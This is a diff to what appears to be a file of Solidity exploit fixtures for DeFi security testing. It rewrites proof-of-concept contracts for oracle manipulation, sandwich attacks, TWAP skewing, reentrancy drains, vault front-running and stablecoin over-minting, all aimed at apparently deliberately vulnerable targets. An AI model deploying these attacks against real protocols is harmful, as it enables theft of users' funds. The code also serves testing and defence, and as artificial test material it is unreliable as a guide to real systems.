@@ -192,36 +192,38 @@ contract GovernanceAttack {
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-interface IDex {
-    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
-    function getReserves() external view returns (uint112, uint112, uint32);
-}
-
 interface ILending {
-    function borrow(uint borrowAmount) external;
-    function liquidate(address borrower, address collateralAsset) external;
+    function updatePrice(uint256 newRateA, uint256 newRateB) external;
+    function depositCollateral(address token, uint256 amount) external;
+    function borrow(address debtToken, uint256 amount) external;
 }
 
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+/// @notice Oracle manipulation against a lending protocol that reads a
+///         single writable price. Deposit collateral, inflate the price
+///         (no access control), borrow far more than legitimately possible.
 contract OracleAttack {
-    IDex public dex;
     ILending public lending;
-    
-    constructor(address _dex, address _lending) {
-        dex = IDex(_dex);
+    address public collateralToken;
+    address public debtToken;
+
+    constructor(address _lending, address _collateral, address _debt) {
         lending = ILending(_lending);
+        collateralToken = _collateral;
+        debtToken = _debt;
     }
-    
-    function attack() external payable {
-        // Step 1: Swap to skew price
-        dex.swap(0, type(uint256).max, address(this), "");
-        
-        // Step 2: Borrow against inflated collateral
-        lending.borrow(type(uint256).max);
-        
-        // Step 3: Price returns to normal, attacker profits
+
+    function attack() external {
+        IERC20(collateralToken).approve(address(lending), type(uint256).max);
+        lending.depositCollateral(collateralToken, 100 ether);
+        // anyone can move the price -> 2x collateral value
+        lending.updatePrice(2 ether, 1 ether);
+        // borrow 100 debt — impossible at the honest 150% ratio
+        lending.borrow(debtToken, 100 ether);
     }
-    
-    receive() external payable {}
 }
 ''',
     },
@@ -338,43 +340,62 @@ contract BridgeSpoof {
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-interface IERC20 {
-    function balanceOf(address) external view returns (uint256);
-    function transfer(address, uint256) external returns (bool);
-}
-
 interface IPair {
-    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+    function getReserves() external view returns (uint256, uint256);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to) external;
 }
 
 interface IWETH {
     function deposit() external payable;
-    function transfer(address, uint256) external returns (bool);
-    function balanceOf(address) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function balanceOf(address who) external view returns (uint256);
 }
 
-// Simplified two-step sandwich PoC
-contract Sandwich {
-    IPair public pool;  // pool where the victim swaps
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function balanceOf(address who) external view returns (uint256);
+}
+
+/// @notice Sandwich a victim swap: front-run to move the price, let the
+///         victim fill at the worse price, then back-run for the profit.
+contract SandwichAttack {
+    IPair public pair;
     IWETH public weth;
+    IERC20 public token;
 
-    constructor(address _pool, address _weth) {
-        pool = IPair(_pool);
+    constructor(address _pair, address _weth, address _token) {
+        pair = IPair(_pair);
         weth = IWETH(_weth);
+        token = IERC20(_token);
     }
 
-    // Front-run: swap ETH -> token before victim
-    function frontRun(uint256 ethAmount) external payable {
-        weth.deposit{value: ethAmount}();
-        weth.transfer(address(pool), ethAmount);
-        pool.swap(0, type(uint256).max, address(this), "");
+    /// Front-run: buy `amountIn` WETH of token at the fair price.
+    function frontRun(uint256 amountIn) external returns (uint256 tknOut) {
+        weth.deposit{value: amountIn}();
+        weth.transfer(address(pair), amountIn);
+        (uint256 r0, uint256 r1) = pair.getReserves();
+        tknOut = getAmountOut(amountIn, r0, r1);
+        pair.swap(0, tknOut, address(this));
     }
 
-    // Back-run: swap token -> ETH after victim fills
-    function backRun(address token) external {
-        IERC20(token).transfer(address(pool), IERC20(token).balanceOf(address(this)));
-        pool.swap(0, type(uint256).max, address(this), "");
-        weth.transfer(msg.sender, weth.balanceOf(address(this)));
+    /// Back-run: sell `tknIn` token back for WETH at the inflated price.
+    function backRun(uint256 tknIn) external returns (uint256 wethOut) {
+        (uint256 r0, uint256 r1) = pair.getReserves();
+        wethOut = getAmountOut(tknIn, r1, r0);
+        token.approve(address(pair), tknIn);
+        token.transfer(address(pair), tknIn);
+        pair.swap(wethOut * 95 / 100, 0, address(this));
+        return weth.balanceOf(address(this));
+    }
+
+    // UniswapV2 getAmountOut (0.3% fee)
+    function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
+        internal pure returns (uint256) {
+        uint256 amountInWithFee = amountIn * 997;
+        uint256 numerator = amountInWithFee * reserveOut;
+        uint256 denominator = reserveIn * 1000 + amountInWithFee;
+        return numerator / denominator;
     }
 }
 ''',
@@ -396,51 +417,30 @@ contract Sandwich {
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.24;
 
-interface IERC20 {
-    function transfer(address, uint256) external returns (bool);
-}
-
 interface ITwap {
+    function sync() external;
+    function swap1To0(uint256 amountIn) external;
     function consult(address token, uint256 amountIn) external view returns (uint256);
 }
 
-interface IDex {
-    function swapExactTokensForTokens(uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline) external returns (uint256[] memory amounts);
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
 }
 
-interface IFlashLender {
-    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external;
-}
+/// @notice TWAP oracle manipulation: one large swap (flash-borrowed capital)
+///         dominates the short observation window and moves the TWAP.
+contract TwapAttack {
+    ITwap public pool;
+    IERC20 public token1;
 
-contract TwapManipulation {
-    ITwap public twap;
-    IDex public dex;
-    IFlashLender public lender;
-
-    constructor(address _twap, address _dex, address _lender) {
-        twap = ITwap(_twap);
-        dex = IDex(_dex);
-        lender = IFlashLender(_lender);
+    constructor(address _pool, address _token1) {
+        pool = ITwap(_pool);
+        token1 = IERC20(_token1);
     }
 
-    function attack(address tokenIn, address tokenOut, uint256 amount) external {
-        lender.flashLoan(address(this), tokenIn, amount, abi.encode(tokenIn, tokenOut));
-    }
-
-    function onFlashLoan(address token, uint256 amount, bytes calldata data) external {
-        (address tokenIn, address tokenOut) = abi.decode(data, (address, address));
-
-        // Push price inside the observation window
-        address[] memory path = new address[](2);
-        path[0] = tokenIn;
-        path[1] = tokenOut;
-        dex.swapExactTokensForTokens(amount, 0, path, address(this), block.timestamp);
-
-        // Oracle now reports a distorted price; trigger the dependent action
-        uint256 distortedPrice = twap.consult(tokenOut, 1e18);
-
-        // Repay the flash loan
-        IERC20(token).transfer(msg.sender, amount);
+    function attack(uint256 amountIn) external {
+        token1.approve(address(pool), amountIn);
+        pool.swap1To0(amountIn);
     }
 }
 ''',
@@ -479,6 +479,8 @@ contract FlashLoanReentrancy {
     IERC20 public token;
     uint256 public attackCount;
     uint256 public maxAttacks;
+    bool public armed;
+    uint256 public drainAmount;
 
     constructor(address _pool, address _token) {
         pool = IPool(_pool);
@@ -493,18 +495,23 @@ contract FlashLoanReentrancy {
         token.approve(address(pool), amount);
         pool.deposit(address(token), amount);
 
+        armed = true;
+        drainAmount = amount;
         attackCount = 0;
-        maxAttacks = 5;
+        maxAttacks = 4;
         pool.withdraw(address(token), amount); // re-enters via token transfer hook
 
+        armed = false;
         token.transfer(msg.sender, amount); // repay flash loan
     }
 
-    function reenter(address _token, uint256 amount) external {
-        // called by the pool's token hook; drains remaining balance
-        if (attackCount < maxAttacks) {
+    // ERC777-style hook fired on every direct token transfer to this contract.
+    // The vulnerable pool sends tokens BEFORE updating balances, so we re-enter
+    // withdraw() and drain the remaining liquidity while the balance is stale.
+    function tokensReceived(address, address, address, uint256, bytes calldata, bytes calldata) external {
+        if (armed && attackCount < maxAttacks) {
             attackCount++;
-            pool.withdraw(_token, amount);
+            pool.withdraw(address(token), drainAmount);
         }
     }
 }
@@ -528,13 +535,13 @@ contract FlashLoanReentrancy {
 pragma solidity ^0.8.24;
 
 interface IVault4626 {
-    function deposit(uint256 assets, address receiver) external returns (uint256);
-    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
+    function deposit(uint256 assets, address receiver) external payable returns (uint256 shares);
+    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
     function convertToAssets(uint256 shares) external view returns (uint256);
 }
 
-// Generic front-run pattern — in practice the attacker scripts two txs
-// around the victim's withdrawal to exploit rounding / share-price moves.
+/// @notice Vault withdraw front-running: deposit right before a victim's
+///         redemption to move the share price / capture rounding, then exit.
 contract WithdrawFrontRun {
     IVault4626 public vault;
 
@@ -542,13 +549,11 @@ contract WithdrawFrontRun {
         vault = IVault4626(_vault);
     }
 
-    function frontRun(uint256 assets) external returns (uint256 shares) {
-        // Deposit right before victim's withdraw to change share price
-        shares = vault.deposit(assets, address(this));
+    function frontRunDeposit(uint256 assets) external payable returns (uint256 shares) {
+        shares = vault.deposit{value: assets}(assets, address(this));
     }
 
-    function backRun(uint256 shares) external returns (uint256 assets) {
-        // Exit right after victim's withdraw
+    function backRunRedeem(uint256 shares) external returns (uint256 assets) {
         assets = vault.redeem(shares, address(this), address(this));
     }
 }
@@ -745,23 +750,37 @@ pragma solidity ^0.8.24;
 interface IStable {
     function openVault() external returns (uint256);
     function depositCollateral(uint256 vaultId, address collateral, uint256 amount) external;
-    function swapCollateral(uint256 vaultId, address fromCollateral, address toCollateral, uint256 amount) external;
+    function updatePrice(uint256 newRateA, uint256 newRateB) external;
     function mint(uint256 vaultId, uint256 amount) external;
 }
 
-contract PegAttack {
-    IStable public stable;
+interface IERC20 {
+    function approve(address spender, uint256 amount) external returns (bool);
+}
 
-    constructor(address _stable) {
-        stable = IStable(_stable);
+/// @notice Stablecoin minted against manipulable collateral: open a vault
+///         backed by cheap collateral, inflate its price (no access
+///         control), mint more stablecoin than the deposit backs.
+contract PegCollateralSwap {
+    IStable public mstable;
+    address public stable;
+    address public collateral;
+
+    constructor(address _mstable, address _stable, address _collateral) {
+        mstable = IStable(_mstable);
+        stable = _stable;
+        collateral = _collateral;
     }
 
-    function attack() external returns (uint256 vaultId) {
-        vaultId = stable.openVault();
-        // Deposit cheap collateral, then swap at the distorted price:
-        // stable.depositCollateral(vaultId, cheapToken, amount);
-        // stable.swapCollateral(vaultId, cheapToken, expensiveToken, amount);
-        // stable.mint(vaultId, maxBackedByInflatedValue);
+    function attack() external returns (uint256 minted) {
+        uint256 id = mstable.openVault();
+        IERC20(collateral).approve(address(mstable), type(uint256).max);
+        mstable.depositCollateral(id, collateral, 1000 ether);
+        // inflate collateralB price 2x (no access control)
+        mstable.updatePrice(1 ether, 2 ether);
+        // mint 1300 stable at 66% LTV of the inflated 2000 value
+        mstable.mint(id, 1300 ether);
+        minted = 1300 ether;
     }
 }
 ''',
